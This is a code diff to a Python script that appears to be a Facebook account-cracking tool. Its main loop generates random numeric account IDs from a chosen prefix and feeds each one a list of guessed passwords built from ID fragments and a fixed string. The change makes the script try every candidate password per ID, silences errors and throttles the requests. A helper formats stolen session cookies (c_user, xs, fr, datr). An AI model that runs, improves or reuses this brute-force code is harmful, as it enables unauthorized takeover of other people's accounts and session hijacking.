@@ -228,21 +228,26 @@ def mmm():
 def main():
     os.system('clear')
     print(logo)
-    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
-    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
-    for a in range(int(limit)):
+    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ')
+    limit = int(input(f'{Y}[{W}~{Y}] {G}Total id {W}: '))
+    gen.clear()
+    for _ in range(limit):
         awm = "".join(random.choice(string.digits) for _ in range(6))
         gen.append(awm)
-    with ThreadPoolExecutor(max_workers=60) as Submits:
-        print(47*"\x1b[1;97m—") 
-        for next in gen:
-            ids = code + next
-            mk = ids[:6]
-            xx = ids[:7]
-            v = ids[:8]
-            b = next[:6]  
-            passlist = random.choice([mk,xx,'57273200',v])
-            Submits.submit(cracker,ids,passlist)
+
+    print(47 * "\x1b[1;97m—")
+    for item in gen:
+        ids = code + item
+        mk = ids[:6]
+        xx = ids[:7]
+        v  = ids[:8]
+        passlist = [mk, xx, '57273200', v]
+        for pwd in passlist:
+            try:
+                cracker(ids, pwd)
+            except Exception:
+                pass
+            time.sleep(0.01)
 
 def convert(cookie):
     cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
